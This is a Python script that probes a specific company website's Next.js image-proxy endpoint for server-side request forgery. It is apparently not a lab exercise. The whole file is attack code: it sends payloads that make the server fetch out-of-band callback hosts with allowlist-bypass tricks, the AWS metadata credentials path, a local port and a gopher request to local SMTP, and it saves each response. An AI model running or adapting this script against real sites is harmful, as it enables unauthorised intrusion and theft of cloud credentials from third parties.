import requests, urllib.parse, time, sys
S = requests.Session()
S.headers.update({
 "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
 "Accept":"*/*",
})
B="https://www.infinitycapital.bh/_next/image"
H1="oob81eecdac4072.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
H2="oob770b07e9eb52.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
V="https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
CASES = [
  ("baseline_valid", V),
  ("oob_direct",    "http://%s/ssrf-direct.jpg" % H1),
  ("oob_https",     "https://%s/ssrf-https.jpg" % H1),
  ("oob_userinfo",  "https://images.ctfassets.net@%s/ssrf-userinfo.jpg" % H1),
  ("oob_userinfo2", "https://%s@images.ctfassets.net/ssrf-userinfo2.jpg" % H2),
  ("oob_subpath",   "https://images.ctfassets.net/%s/ssrf-subpath.jpg" % H1),
  ("oob_query",     "https://images.ctfassets.net/x.jpg?cb=%s" % H1),
  ("meta_aws",      "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
  ("local_etc",     "http://127.0.0.1:3000/"),
  ("gopher_local",  "gopher://127.0.0.1:25/_HELLO"),
]
for tag, u in CASES:
    url = B + "?url=" + urllib.parse.quote(u, safe="") + "&w=640&q=75"
    try:
        r = S.get(url, timeout=45, allow_redirects=False)
        body = r.content[:120]
        print("%-16s %s len=%-7d ct=%-18s loc=%s" % (tag, r.status_code, len(r.content), r.headers.get('content-type','')[:18], r.headers.get('location','')[:60]))
        print("     body[:100]=%r" % body)
        open("d10b/ssrf_%s.bin" % tag, "wb").write(r.content)
    except Exception as e:
        print("%-16s ERR %s" % (tag, e))
    time.sleep(2)
